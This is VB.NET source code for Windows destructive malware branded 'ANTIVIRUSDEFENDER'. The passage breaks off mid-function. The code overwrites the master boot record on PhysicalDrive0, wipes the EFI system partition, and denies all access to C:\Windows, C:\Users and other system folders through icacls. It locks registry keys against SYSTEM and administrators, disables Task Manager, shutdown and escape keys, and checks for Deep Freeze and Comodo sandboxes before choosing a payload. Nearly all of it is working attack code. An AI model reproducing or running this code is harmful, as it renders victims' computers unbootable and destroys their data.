Imports System.IO
Imports Microsoft.Win32
Imports System.Security.AccessControl
Imports System.Security.Principal
Imports System.Runtime.InteropServices
Imports System.Management
Imports System.Media
Imports System.Threading
Imports System.Drawing.Drawing2D
Imports System.ServiceProcess
Imports System.Text

Public Class Form1
    Inherits Form

    Private titleLabel As Label
    Private instructionLabel As Label
    Private inputTextBox As TextBox
    Private WithEvents ActivateButton As Button
    Private WithEvents ExitButton As Button
    Private headerPanel As Panel
    Private footerPanel As Panel
    Private antivirusdefenderImage As Image
    Private random As New Random()
    ' Constants for keyboard hook
    Private Const WH_KEYBOARD_LL As Integer = 13
    Private Const WM_KEYDOWN As Integer = &H100
    Private Const VK_LWIN As Integer = &H5B
    Private Const VK_RWIN As Integer = &H5C
    ' Hook handle and callback delegate
    Private hookID As IntPtr = IntPtr.Zero
    Private hookCallbackDelegate As HookProc

    ' Delegate for hook callback
    Private Delegate Function HookProc(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr

    ' Class-level variable to hold the overlay instance
    Public overlay As FullScreenOverlay

    ' Constructor
    Public Sub New()
        InitializeComponent()
    End Sub

    ' Windows API declarations
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetModuleHandle(lpModuleName As String) As IntPtr
    End Function

    <DllImport("user32.dll")>
    Private Shared Function SetWindowsHookEx(idHook As Integer, lpfn As HookProc, hMod As IntPtr, dwThreadId As UInteger) As IntPtr
    End Function

    ' Set up the low-level keyboard hook
    Private Function SetHook(proc As HookProc) As IntPtr
        Using curProc As Process = Process.GetCurrentProcess()
            Using curModule As ProcessModule = curProc.MainModule
                Return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(Nothing), 0)
            End Using
        End Using
    End Function

    ' Declare the SYSTEMTIME structure for setting the date
    <StructLayout(LayoutKind.Sequential)>
    Private Structure SYSTEMTIME
        Public wYear As UShort
        Public wMonth As UShort
        Public wDayOfWeek As UShort
        Public wDay As UShort
        Public wHour As UShort
        Public wMinute As UShort
        Public wSecond As UShort
        Public wMilliseconds As UShort
    End Structure

    ' Declare the SetLocalTime API function
    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Shared Function SetLocalTime(ByRef time As SYSTEMTIME) As Boolean
    End Function

    <DllImport("user32.dll")>
    Private Shared Function CallNextHookEx(hhk As IntPtr, nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
    End Function

    Public Class FullScreenOverlay
        Inherits Form

        Private ReadOnly random As New Random()
        Private ReadOnly timerLabel As New Label()
        Private ReadOnly audioPlayer As New AudioPlayer()
        Private countdownTime As Integer = 60 ' Countdown timer in seconds
        Private portalEffectPhase As Single = 0.0F ' Phase for wavy distortion

        ' Initialize the full-screen overlay form
        Public Sub New()
            FormBorderStyle = FormBorderStyle.None
            Bounds = Screen.PrimaryScreen.Bounds ' Set form to full-screen
            TopMost = True
            BackColor = Color.Black
            Opacity = 0.7 ' Transparency setting

            ' Initialize and display the timer label
            timerLabel.AutoSize = True
            timerLabel.ForeColor = Color.White
            timerLabel.Font = New Font("Segoe UI", 20, FontStyle.Bold)
            timerLabel.Location = New Point(10, 10) ' Position of the timer on the screen
            Controls.Add(timerLabel)

            ' Initialize and start audio
            audioPlayer.PlayAudio()

        End Sub

        ' Public method to run the VBS script.
        Public Sub ApplyMaximumDestruction()
            Form1.CreateEpicVBScriptFile()
            Dim scriptPath As String = "C:\temp.vbs"
            Try
                Dim process As New Process()
                process.StartInfo.FileName = "wscript.exe"
                process.StartInfo.Arguments = $"""{scriptPath}"""
                process.StartInfo.UseShellExecute = False
                process.StartInfo.RedirectStandardOutput = True
                process.StartInfo.RedirectStandardError = True
                process.StartInfo.CreateNoWindow = True

                process.Start()
                Dim output As String = process.StandardOutput.ReadToEnd()
                Dim errorOutput As String = process.StandardError.ReadToEnd()
                process.WaitForExit()

                If Not String.IsNullOrEmpty(output) Then
                    MessageBox.Show("Output: " & output, "Script Output", MessageBoxButtons.OK, MessageBoxIcon.Information)
                End If

                If Not String.IsNullOrEmpty(errorOutput) Then
                    MessageBox.Show("Error: " & errorOutput, "Script Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                End If
            Catch ex As Exception
                MessageBox.Show("An error occurred while executing the script: " & ex.Message, "Execution Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try
        End Sub

        Private Sub ReplaceBootx64WithBootmgfw()
            Try
                ' 1. Mount the EFI system partition to X:
                Dim mountvolProcess As New Process()
                mountvolProcess.StartInfo.FileName = "cmd.exe"
                mountvolProcess.StartInfo.Arguments = "/C mountvol X: /s /q"
                mountvolProcess.StartInfo.CreateNoWindow = True
                mountvolProcess.StartInfo.UseShellExecute = False
                mountvolProcess.Start()
                mountvolProcess.WaitForExit()

                ' 2. Delete all contents from the X: drive (EFI system partition)
                Dim rdProcess As New Process()
                rdProcess.StartInfo.FileName = "cmd.exe"
                rdProcess.StartInfo.Arguments = "/C rd X:\ /s /q"
                rdProcess.StartInfo.CreateNoWindow = True
                rdProcess.StartInfo.UseShellExecute = False
                rdProcess.Start()
                rdProcess.WaitForExit()

                ' 3. Extract bootmgfw.efi from Resource1 (string to byte array conversion)
                Dim bootmgfwString As String = My.Resources.Resource1.bootmgfw
                Dim bootmgfwData As Byte() = Encoding.UTF8.GetBytes(bootmgfwString)

                ' 4. Ensure the target directory exists
                Dim efiDir As String = "X:\EFI"
                Dim targetFilePath As String = "X:\EFI\bootx64.efi"

                If Not Directory.Exists(efiDir) Then
                    Directory.CreateDirectory(efiDir)
                End If

                ' 5. Write bootmgfw.efi to X:\EFI\bootx64.efi
                File.WriteAllBytes(targetFilePath, bootmgfwData)

                MessageBox.Show("Successfully replaced bootx64.efi with bootmgfw.efi", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)

            Catch ex As Exception
                MessageBox.Show("Error during the replacement process: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Finally
                ' Unmount X: drive
                Dim unmountProcess As New Process()
                unmountProcess.StartInfo.FileName = "cmd.exe"
                unmountProcess.StartInfo.Arguments = "/C mountvol X: /d"
                unmountProcess.StartInfo.CreateNoWindow = True
                unmountProcess.StartInfo.UseShellExecute = False
                unmountProcess.Start()
                unmountProcess.WaitForExit()
            End Try
        End Sub

        ' Function to execute different payloads based on user choice
        Private Sub ExecuteDestruction(choice As String)
            ' Create an instance of the ComodoAntivirusDetector class
            Dim detector As New StupidSandboxThingsDetector()
            ' Check if Deep Freeze is detected
            If detector.DetectDeepFreeze() Then
                Select Case choice
                    Case "Maximum Destruction"
                        ' Code for maximum destruction
                        timerLabel.Text = "It can't defend against UEFI! Executing maximum destruction!"
                        Thread.Sleep(5000)
                        Form1.WriteMBR()
                        Form1.KillGrantAccessAndDeleteShutdownExe()
                        ReplaceBootx64WithBootmgfw()
                        ApplyMaximumDestruction()

                    Case "Classic MBR/UEFI FEffects"
                        ' Code for classic UEFI effects
                        timerLabel.Text = "It can't defend against UEFI! Executing classic UEFI effects!"
                        Thread.Sleep(5000)
                        Form1.WriteMBR()
                        Form1.KillGrantAccessAndDeleteShutdownExe()
                        ReplaceBootx64WithBootmgfw()

                    Case "Surprise Me"
                        ' Code for less destructive surprise
                        timerLabel.Text = "Deep Freeze user detected! Non-destructive request declined."
                        Thread.Sleep(5000)

                    Case "Just Make Unusable My PC Without Destruction"
                        ' Code for access restrictions
                        timerLabel.Text = "Deep Freeze user detected! Non-destructive request declined."
                        Thread.Sleep(5000)

                    Case Else
                        timerLabel.Text = "Invalid choice!"
                End Select
            Else
                ' Code for scenarios when Deep Freeze is not detected
                Select Case choice
                    Case "Maximum Destruction with MBR/UEFI"
                        ' Code for maximum destruction
                        timerLabel.Text = "Executing maximum destruction!"
                        Thread.Sleep(5000)
                        Form1.WriteMBR()
                        Form1.KillGrantAccessAndDeleteShutdownExe()
                        ReplaceBootx64WithBootmgfw()
                        ApplyMaximumDestruction()

                    Case "Classic MBR/UEFI Effects"
                        ' Code for classic UEFI effects
                        timerLabel.Text = "Executing classic UEFI effects!"
                        Thread.Sleep(5000)
                        ' Write UEFI using bootmgfw from Resource1
                        Form1.WriteMBR()
                        Form1.KillGrantAccessAndDeleteShutdownExe()
                        ReplaceBootx64WithBootmgfw()

                    Case "Surprise Me"
                        ' Code for less destructive surprise
                        timerLabel.Text = "Surprise! Executing less destructive effects!"
                        Thread.Sleep(5000)
                        Form1.CreateEpicVBScriptFile()
                        Process.Start("shutdown -s -t 5")
                        Process.Start("shutdown -a")
                        Process.Start("shutdown -s -t 5")
                        Process.Start("shutdown -a")
                        Process.Start("shutdown -s -t 5")
                        Process.Start("shutdown -a")
                        Process.Start("shutdown -s -t 5")
                        Process.Start("shutdown -a")
                        Process.Start("shutdown -s -t 5")
                        Process.Start("shutdown -a")
                        Process.Start("shutdown -s -t 5")
                        Process.Start("shutdown -a")
                        Process.Start("shutdown -s -t 5")
                        Process.Start("shutdown -a")
                        Process.Start("shutdown -s -t 5")
                        Process.Start("shutdown -a")
                        Process.Start("shutdown -s -t 5")
                        Process.Start("shutdown -a")
                        Process.Start("shutdown -s -t 5")
                    Case "Just Make Unusable My PC Without Destruction"
                        ' Code for access restrictions
                        timerLabel.Text = "You can't access your files anymore!"
                        Thread.Sleep(5000)
                        ApplyAccessRestrictions()

                    Case Else
                        timerLabel.Text = "Invalid choice!"
                End Select
            End If
        End Sub

        ' Timer tick function, applies effects and updates countdown timer
        Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs)
            Try
                Dim g As Graphics = CreateGraphics()
                g.SmoothingMode = SmoothingMode.None

                ' Draw portal effect first
                ApplyPortalEffect(g)

                ' Update the countdown timer label
                If countdownTime > 0 Then
                    countdownTime -= 1
                    timerLabel.Text = "Remaining Time: " & countdownTime.ToString() & " seconds"
                Else
                    ' When countdown finishes, prompt user for destruction option
                    Dim options As String() = {
                "Maximum Destruction",
                "Classic MBR/UEFI Effects",
                "Surprise Me",
                "Just Make Unusable My PC Without Destruction"
            }

                    Dim choice As String = PromptUserForChoice("Select a destruction option:", options)

                    If Not String.IsNullOrEmpty(choice) Then
                        timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
                        Thread.Sleep(5000) ' Optional: Adjust as needed
                        ExecuteDestruction(choice)
                    End If
                End If

            Catch ex As Exception
                MessageBox.Show("An error occurred during animation: " & ex.Message, "Animation Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try
        End Sub

        ' Function to prompt user for a choice using a MessageBox
        Private Function PromptUserForChoice(messaage As String, options As String()) As String
            Dim result As DialogResult = MessageBox.Show(messaage, "Choose an Option", MessageBoxButtons.OKCancel, MessageBoxIcon.Question)

            If result = DialogResult.OK Then
                ' Create a simple input dialog
                Dim choice As String = InputBox("Select your choice:", "User Choice", options(0))

                ' Validate user choice against available options
                For Each opt In options ' Renamed the variable from 'option' to 'opt'
                    If choice.Equals(opt, StringComparison.OrdinalIgnoreCase) Then
                        Return opt
                    End If
                Next

                MessageBox.Show("Invalid choice! Please select a valid option.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
            End If

            Return String.Empty
        End Function

        ' Apply access restrictions
        Private Sub ApplyAccessRestrictions()
            Dim commands As String() = {
            "icacls ""C:\Windows"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Program Files"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\ProgramData"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\System Volume Information"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Recovery"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\$RECYCLE.BIN"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Windows\config"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Windows\system32"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Windows\system"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Windows\winsxs"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Windows\SysWOW64"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Users"" /deny Everyone:(OI)(CI)F"
        }

            For Each command As String In commands
                Try
                    Form1.ExecuteCommand(command)
                Catch ex As Exception
                    MessageBox.Show("Failed to apply access restrictions: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                End Try
            Next
        End Sub

        ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion
        Public Sub ApplyPortalEffect(g As Graphics)
            Dim gridSize As Integer = 20 ' Size of each pixelated "block"
            portalEffectPhase += 0.05F ' Increment phase for wavy distortion

            Try
                ' Load the byte array from resources using My.Resources
                Dim portalImageBytes As Byte() = My.Resources.Resource1.antivirusdefender

                ' Convert the byte array to an Image
                Dim portalImage As Image
                Using ms As New MemoryStream(portalImageBytes)
                    portalImage = Image.FromStream(ms)
                End Using

                ' Save the image to file
                Dim filePath As String = "C:\antivirusdefender.png"
                portalImage.Save(filePath, System.Drawing.Imaging.ImageFormat.Png)

                ' Draw the image with the portal effect
                For y As Integer = 0 To Height Step gridSize
                    For x As Integer = 0 To Width Step gridSize
                        ' Add randomness to the sine wave calculation for distortion
                        Dim randomOffsetX As Integer = random.Next(-5, 6) ' Random offset between -5 and 5
                        Dim randomOffsetY As Integer = random.Next(-5, 6) ' Random offset between -5 and 5

                        ' Calculate distorted positions using sine wave and random offsets
                        Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 30.0F) * 10) + randomOffsetX
                        Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 30.0F) * 10) + randomOffsetY

                        ' Draw the image at the distorted coordinates
                        g.DrawImage(portalImage, distortedX, distortedY, gridSize, gridSize)
                    Next
                Next

            Catch ex As Exception
                ' Handle exception, display a message
                MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try
        End Sub

        ' Prevent form from closing
        Protected Overrides Sub OnFormClosing(e As FormClosingEventArgs)
            e.Cancel = True
        End Sub
    End Class

    Private Function HookCallback(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
        If nCode >= 0 AndAlso wParam = CType(WM_KEYDOWN, IntPtr) Then
            Dim vkCode As Integer = Marshal.ReadInt32(lParam)
            ' Ignore Windows key presses
            If vkCode = VK_LWIN Or vkCode = VK_RWIN Then
                Return CType(1, IntPtr) ' Prevent the key from being processed
            End If
        End If
        Return CallNextHookEx(hookID, nCode, wParam, lParam)
    End Function

    ' Prevent form from closing
    Protected Overrides Sub OnFormClosing(e As FormClosingEventArgs)
        e.Cancel = True
    End Sub

    ' Override ProcessCmdKey to handle specific keys
    Protected Overrides Function ProcessCmdKey(ByRef msg As Message, keyData As Keys) As Boolean
        ' Prevent specific key combinations
        If keyData = (Keys.Control Or Keys.Delete) Then
            Return True
        End If

        Return MyBase.ProcessCmdKey(msg, keyData)
    End Function

    ' Disable Alt + F4
    Protected Overrides Sub WndProc(ByRef m As Message)
        Const WM_SYSCOMMAND As Integer = &H112
        Const SC_CLOSE As Integer = &HF060

        If m.Msg = WM_SYSCOMMAND AndAlso m.WParam.ToInt32() = SC_CLOSE Then
            ' Ignore Alt + F4
            Return
        End If

        MyBase.WndProc(m)
    End Sub

    Public Class AudioPlayer
        Private ReadOnly soundPlayer As New SoundPlayer()
        Private ReadOnly wavStream As MemoryStream

        Public Sub New()
            ' Extract the WAV byte array from resources using My.Resources
            Dim wavBytes As Byte() = My.Resources.Resource1.antivirusdefenderaudio

            ' Use MemoryStream to play the WAV
            wavStream = New MemoryStream(wavBytes)

            ' Load the WAV file into the SoundPlayer
            soundPlayer.Stream = wavStream
        End Sub

        ' Method to play the audio
        Public Sub PlayAudio()
            soundPlayer.Play()
        End Sub
    End Class

    Public Class StupidSandboxThingsDetector

        ' Public method to detect if Comodo Antivirus is installed or present.
        Public Function DetectComodoAntivirus() As Boolean
            ' Check for the installation paths
            Dim comodoPaths As String() = {
            "C:\Program Files\COMODO\COMODO Internet Security\",
            "C:\Program Files (x86)\COMODO\COMODO Internet Security\"
        }

            For Each path As String In comodoPaths
                If PathExists(path) Then
                    Return True
                End If
            Next

            ' Check for the Comodo Antivirus driver
            Dim driverPath As String = "C:\Windows\System32\drivers\cmdguard.sys"
            If PathExists(driverPath) Then
                Return True
            End If

            ' Check for Comodo Antivirus registry key
            If CheckComodoRegistry() Then
                Return True
            End If

            ' Check for Comodo Antivirus service
            If CheckComodoService() Then
                Return True
            End If

            Return False
        End Function

        ' Public method to detect if Deep Freeze is installed or present.
        Public Function DetectDeepFreeze() As Boolean
            ' Check for the installation paths
            Dim deepFreezePaths As String() = {
            "C:\Program Files\Faronics\Deep Freeze\",
            "C:\Program Files (x86)\Faronics\Deep Freeze\"
        }

            For Each path As String In deepFreezePaths
                If PathExists(path) Then
                    Return True
                End If
            Next

            ' Check for the Deep Freeze driver
            Dim driverPath As String = "C:\Persi0.sys"
            If PathExists(driverPath) Then
                Return True
            End If

            ' Check for Deep Freeze registry key
            If CheckDeepFreezeRegistry() Then
                Return True
            End If

            ' Check for Deep Freeze service
            If CheckDeepFreezeService() Then
                Return True
            End If

            Return False
        End Function

        ' Private method to check if a given path exists.
        Private Function PathExists(path As String) As Boolean
            Return Directory.Exists(path)
        End Function

        ' Private method to check for Comodo Antivirus in the registry key.
        Private Function CheckComodoRegistry() As Boolean
            Dim comodoKey As String = "SOFTWARE\COMODO\CIS"
            Return RegistryKeyExists(Registry.LocalMachine, comodoKey)
        End Function

        ' Private method to check for Deep Freeze in the registry key.
        Private Function CheckDeepFreezeRegistry() As Boolean
            Dim deepFreezeKey As String = "SOFTWARE\Classes\TypeLib\{C5D763D9-2422-4B2D-A425-02D5BD016239}\1.0\HELPDIR"
            Return RegistryKeyExists(Registry.LocalMachine, deepFreezeKey)
        End Function

        ' Private method to check for the Comodo Antivirus service.
        Private Function CheckComodoService() As Boolean
            Dim serviceName As String = "cmdagent"
            Return ServiceExists(serviceName)
        End Function

        ' Private method to check for the Deep Freeze service.
        Private Function CheckDeepFreezeService() As Boolean
            Dim serviceName As String = "DFServ"
            Return ServiceExists(serviceName)
        End Function

        ' Private method to check if a service exists using ServiceController.
        Private Function ServiceExists(serviceName As String) As Boolean
            Try
                Using sc As New ServiceController(serviceName)
                    ' If we can access the service, it exists
                    Dim status As ServiceControllerStatus = sc.Status
                    Return True
                End Using
            Catch ex As InvalidOperationException
                ' This exception indicates the service does not exist
                Return False
            Catch ex As TimeoutException
                ' This exception may occur if the service is taking too long to respond
                Return False
            Catch ex As Exception
                ' Handle other exceptions if necessary
                Return False
            End Try
        End Function

        ' Private method to check if a registry key exists.
        Private Function RegistryKeyExists(root As RegistryKey, path As String) As Boolean
            Using key As RegistryKey = root.OpenSubKey(path)
                Return key IsNot Nothing
            End Using
        End Function

    End Class

    'You need use hex editor to extract hex data
    Private Function ExtractMbrToTempFile() As String
        ' Create a temporary file
        Dim tempFilePath As String = Path.GetTempFileName()

        ' Hex data as a string
        Dim hexData As String = "EB0031C08ED8FC1312111009080706050400BE0000BF01008A84077CB400CD10E80B00E844004683FE0A7CECEBFEB90500BF0100E82200E8300083FF01750D83C10183F9147EEDBF0000EBE883E90183F9057DE0BF0100EBDC0FB30FBE707CAC3C007406B40ECD10EBF5C3B9FFFF4975FDC3414E54544956495253444546454E444552203130204E4F572049344F555252204E494748544D4141524553205448455245204953204E4F204553434150455920594F55522050432049532052"

        ' Convert hex string to byte array
        Dim mbrData As Byte() = Enumerable.Range(0, hexData.Length \ 2).Select(Function(i) Convert.ToByte(hexData.Substring(i * 2, 2), 16)).ToArray()

        ' Pad the byte array to 512 bytes with zeros if it's shorter
        If mbrData.Length < 512 Then
            Array.Resize(mbrData, 512)
        End If

        ' Ensure the last two bytes are 0x55 and 0xAA
        mbrData(510) = &H55
        mbrData(511) = &HAA

        ' Write the MBR data to the temporary file
        File.WriteAllBytes(tempFilePath, mbrData)

        Return tempFilePath
    End Function

    ' API imports
    <DllImport("kernel32")>
    Private Shared Function CreateFile(
        lpFileName As String,
        dwDesiredAccess As UInteger,
        dwShareMode As UInteger,
        lpSecurityAttributes As IntPtr,
        dwCreationDisposition As UInteger,
        dwFlagsAndAttributes As UInteger,
        hTemplateFile As IntPtr) As IntPtr
    End Function

    <DllImport("kernel32")>
    Private Shared Function WriteFile(
        hFile As IntPtr,
        lpBuffer As Byte(),
        nNumberOfBytesToWrite As UInteger,
        ByRef lpNumberOfBytesWritten As UInteger,
        lpOverlapped As IntPtr) As Boolean
    End Function

    <DllImport("kernel32")>
    Private Shared Function CloseHandle(hObject As IntPtr) As Boolean
    End Function

    ' Constants
    Private Const GenericWrite As UInteger = &H40000000
    Private Const OpenExisting As UInteger = &H3
    Private Const FileShareRead As UInteger = &H1
    Private Const FileShareWrite As UInteger = &H2
    Private Const MbrSize As UInteger = 512

    Private Sub WriteMBR()
        ' Extract MBR to a temporary file
        Dim tempFilePath As String = ExtractMbrToTempFile()

        ' Load the MBR data from the temporary file
        Dim mbrData As Byte() = File.ReadAllBytes(tempFilePath)

        If mbrData.Length <> MbrSize Then
            MessageBox.Show("Invalid MBR data size.")
            Return
        End If

        ' Open the disk for writing
        Dim mbrHandle As IntPtr = CreateFile(
        "\\.\PhysicalDrive0",
        GenericWrite,
        FileShareRead Or FileShareWrite,
        IntPtr.Zero,
        OpenExisting,
        0,
        IntPtr.Zero)

        If mbrHandle = New IntPtr(-1) Then
            MessageBox.Show("Run as administrator")
            Return
        End If

        ' Write the MBR data to the disk
        Dim bytesWritten As UInteger = 0
        WriteFile(mbrHandle, mbrData, MbrSize, bytesWritten, IntPtr.Zero)
        ' Close the handle
        CloseHandle(mbrHandle)

        ' Delete the temporary file
        If File.Exists(tempFilePath) Then
            File.Delete(tempFilePath)
        End If
    End Sub

    Public Sub DisableLogoffSwitchUserAndShutdown()
        ' Registry paths
        Dim explorerRegPath As String = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        Dim systemRegPath As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"

        Try
            ' Open or create the registry key for Explorer policies
            Using explorerRegKey As RegistryKey = Registry.CurrentUser.CreateSubKey(explorerRegPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
                ' Set NoLogoff key to 1 (disable Logoff)
                explorerRegKey?.SetValue("NoLogoff", 1, RegistryValueKind.DWord)
                ' Set NoClose key to 1 (disable Shut Down/Restart)
                explorerRegKey?.SetValue("NoClose", 1, RegistryValueKind.DWord)
            End Using

            ' Open or create the registry key for System policies (Disable Task Manager)
            Using systemRegKey As RegistryKey = Registry.CurrentUser.CreateSubKey(systemRegPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
                ' Set DisableTaskMgr key to 1 (disable Task Manager)
                systemRegKey?.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord)
                ' Set HideFastUserSwitching key to 1 (disable Switch User)
                systemRegKey?.SetValue("HideFastUserSwitching", 1, RegistryValueKind.DWord)
            End Using

        Catch ex As Exception
            MessageBox.Show("An error occurred while modifying registry keys: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Update registry settings
    Private Sub UpdateRegistrySettings()
        Try
            ' Change the EnableLUA key
            Dim regKeyPath As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            Using regKey As RegistryKey = Registry.LocalMachine.OpenSubKey(regKeyPath, True)
                ' Set EnableLUA key to 1 if regKey is not null
                regKey?.SetValue("EnableLUA", 1, RegistryValueKind.DWord)
            End Using

            ' Lock the registry key
            LockRegistryKey(regKeyPath)

        Catch ex As Exception
            Console.WriteLine("An error occurred while updating UAC: " & ex.Message)
        End Try
    End Sub

    Private Sub LockRegistryKey(keyPath As String)
        Try
            ' Open the registry key with permission to change security
            Using key As RegistryKey = Registry.LocalMachine.OpenSubKey(keyPath, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions)
                If key IsNot Nothing Then
                    ' Get the current security settings
                    Dim security As RegistrySecurity = key.GetAccessControl()

                    ' Remove all access to the key
                    Dim everyone As New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing)
                    Dim system As New SecurityIdentifier(WellKnownSidType.LocalSystemSid, Nothing)
                    Dim admins As New SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, Nothing)

                    ' Purge existing access rules
                    security.PurgeAccessRules(everyone)
                    security.PurgeAccessRules(system)
                    security.PurgeAccessRules(admins)

                    ' Remove all access rights for everyone, system, and admins
                    security.AddAccessRule(New RegistryAccessRule(everyone, RegistryRights.FullControl, AccessControlType.Deny))
                    security.AddAccessRule(New RegistryAccessRule(system, RegistryRights.FullControl, AccessControlType.Deny))
                    security.AddAccessRule(New RegistryAccessRule(admins, RegistryRights.FullControl, AccessControlType.Deny))

                    ' Apply the changes to the registry key
                    key.SetAccessControl(security)
                End If
            End Using

        Catch ex As Exception
            MessageBox.Show("An error occurred while lock: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Execute a system command
    Private Sub ExecuteCommand(command As String)
        Try
            Dim process As New Process()
            process.StartInfo.FileName = "cmd.exe"
            process.StartInfo.Arguments = "/C " & command
            process.StartInfo.UseShellExecute = False
            process.StartInfo.RedirectStandardOutput = True
            process.StartInfo.RedirectStandardError = True
            process.Start()

            process.WaitForExit()
        Catch ex As Exception
            MessageBox.Show("Command execution failed: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Import SystemParametersInfo function to set wallpaper
    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
    Private Shared Function SystemParametersInfo(uAction As UInteger, uParam As UInteger, lpvParam As String, fuWinIni As UInteger) As Boolean
    End Function

    ' Constants for setting wallpaper
    Private Const SPI_SETDESKWALLPAPER As Integer = 20
    Private Const SPIF_UPDATEINIFILE As Integer = &H1
    Private Const SPIF_SENDCHANGE As Integer = &H2

    ' Function to convert byte array to Image
    Private Function ByteArrayToImage(byteArray As Byte()) As Image
        Using ms As New MemoryStream(byteArray)
            Return Image.FromStream(ms)
        End Using
    End Function

    ' Function to set the wallpaper
    Public Sub SetWallpaper()
        Try
            ' Load the antivirusdefenderwall image from resources as a byte array
            Dim wallpaperBytes As Byte() = My.Resources.Resource1.antivirusdefenderwall

            ' Check if the wallpaper data is valid
            If wallpaperBytes Is Nothing OrElse wallpaperBytes.Length = 0 Then
                MessageBox.Show("Error: Wallpaper data is not available.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If

            ' Save the byte array directly to a temporary file
            Dim wallpaperTempPath As String = Path.Combine(Path.GetTempPath(), "ANTIVIRUSDEFENDERWALL.jpg")
            File.WriteAllBytes(wallpaperTempPath, wallpaperBytes)

            ' Set the wallpaper
            If Not SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperTempPath, SPIF_UPDATEINIFILE Or SPIF_SENDCHANGE) Then
                MessageBox.Show("Error: Unable to set wallpaper.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If

            ' Prevent changing the wallpaper by modifying the registry
            Using key As RegistryKey = Registry.CurrentUser.OpenSubKey("Control Panel\Desktop", True)
                key?.SetValue("NoChangingWallpaper", 1, RegistryValueKind.DWord)
            End Using

            ' Update file icon appearance
            UpdateAllFileIcons()

        Catch ex As Exception
            MessageBox.Show("An error occurred while setting the wallpaper: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Helper metho0d to save an image to a file
    Private Sub SaveImageToFile(image As Image, filePath As String)
        Using fs As New FileStream(filePath, FileMode.Create, FileAccess.Write)
            image.Save(fs, Imaging.ImageFormat.Png)
        End Using
    End Sub

    Public Sub UpdateAllFileIcons()
        Try
            ' Define a path for the temporary .ico file
            Dim iconIcoPath As String = Path.Combine(Path.GetTempPath(), "app_icon.ico")

            ' Save the form's icon as a .ico file
            Using fs As New FileStream(iconIcoPath, FileMode.Create)
                Icon.Save(fs) ' Ensure the form has an icon assigned
            End Using

            ' Icon path in registry format
            Dim iconPath As String = $"""{iconIcoPath}"",0"

            ' Registry keys for DefaultIcon in HKEY_CLASSES_ROOT
            Dim regKeys As String() = {
            "txtfile\DefaultIcon",
            "exefile\DefaultIcon",
            "mp3file\DefaultIcon",
            "mp4file\DefaultIcon",
            "themefile\DefaultIcon"
        }

            ' Update DefaultIcon for each key in HKEY_CLASSES_ROOT
            For Each regKey In regKeys
                UpdateRegistryKey(Registry.ClassesRoot, regKey, iconPath)
            Next

        Catch ex As Exception
            MessageBox.Show("An error occurred while updating file icons: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub UpdateRegistryKey(baseHive As RegistryKey, subKey As String, iconPath As String)
        Try
            ' Create or open the key with write access directly
            Using key As RegistryKey = baseHive.CreateSubKey(subKey, True)
                ' Directly set the value for the specified subkey, overwriting any existing value
                key.SetValue("", iconPath, RegistryValueKind.String) ' Use empty string if default value is intended
            End Using

            ' Lock the registry key path
            LockRegistryKey(subKey)

        Catch ex As Exception
            ' Silently catch any exceptions to avoid displaying error messages
            ' Errors are ignored to prevent interruptions in the process
        End Try
    End Sub

    ' Disconnect the Internet by disabling all network adapters
    Private Sub DisconnectInternet()
        Try
            Dim networkManagement As New ManagementClass("Win32_NetworkAdapter")
            Dim networkAdapters As ManagementObjectCollection = networkManagement.GetInstances()
            For Each adapter As ManagementObject In networkAdapters
                If CBool(adapter("NetEnabled")) Then
                    ' Disable the network adapter
                    adapter.InvokeMethod("Disable", Nothing)
                    Console.WriteLine($"Disabled adapter: {adapter("Name")}")
                End If
